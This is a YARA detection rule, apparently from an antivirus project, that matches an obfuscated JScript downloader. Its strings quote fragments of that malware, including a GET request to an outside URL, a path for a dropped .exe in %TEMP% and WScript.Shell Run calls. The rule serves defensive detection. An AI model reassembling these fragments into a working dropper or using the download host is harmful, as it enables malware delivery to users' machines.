rule sig_20160329_b0a97b4228d9617e07f1a3a4d3b3bbe4 {
  meta:
    description = "datamaliciousorder - file 20160329_b0a97b4228d9617e07f1a3a4d3b3bbe4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2fe9d62f7edd2251ba543316cea74cbc4bd4e57590368b72a3556767c60b9a90"

  strings:
    $s1  = "function Seefefpz() {return Zopastrt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"o9IBy3jdL.exe\";};" fullword ascii
    $s2  = "do {WScript[Ghprx](Bdtyjro() * 11)} while (Hqlkhryw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Yiduldzoz(Gfdbzfzxls, Aothls){return Gfdbzfzxls - Aothls;};" fullword ascii
    $s4  = "Hqlkhryw[Vonytoffm](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s5  = "var Zopastrt = function Tlmyym() {return WScript[Kqumeyivlz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ihaaqz(Uooof){Zopastrt[\"Run\"](Uooof, Hvqhwtvur, Hvqhwtvur);};" fullword ascii
    $s7  = "function Mvvtdlvws() {return ((Ryeyfe == true) && (Ryeyfe == Mhwsl)) ? 1 : Hvqhwtvur;};" fullword ascii
    $s8  = "var Tnnbaknlki = new this[\"Date\"]();" fullword ascii
    $s9  = "var Ryeyfe = false;" fullword ascii
    $s10 = "function Bdtyjro(){return 22;};" fullword ascii
    $s11 = "function Bkzkcmm(Zwegmhtch) {var Jbyyv = (1, 2, 3, 4, 5, Zwegmhtch); return Jbyyv;};" fullword ascii
    $s12 = "Mhwsl = true; " fullword ascii
    $s13 = "var Jgmide = false;" fullword ascii
    $s14 = "Ryeyfe = true; " fullword ascii
    $s15 = "function Kzheaa(){return Kqumeyivlz;};" fullword ascii
    $s16 = "return Yiduldzoz(Jckuy, Pzkoiz);" fullword ascii
    $s17 = "var Mhwsl = false;" fullword ascii
    $s18 = "function Hwyttw(){return Fwuyykl;};" fullword ascii
    $s19 = " while (Dialdlt){" fullword ascii
    $s20 = "function Hghyerlf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}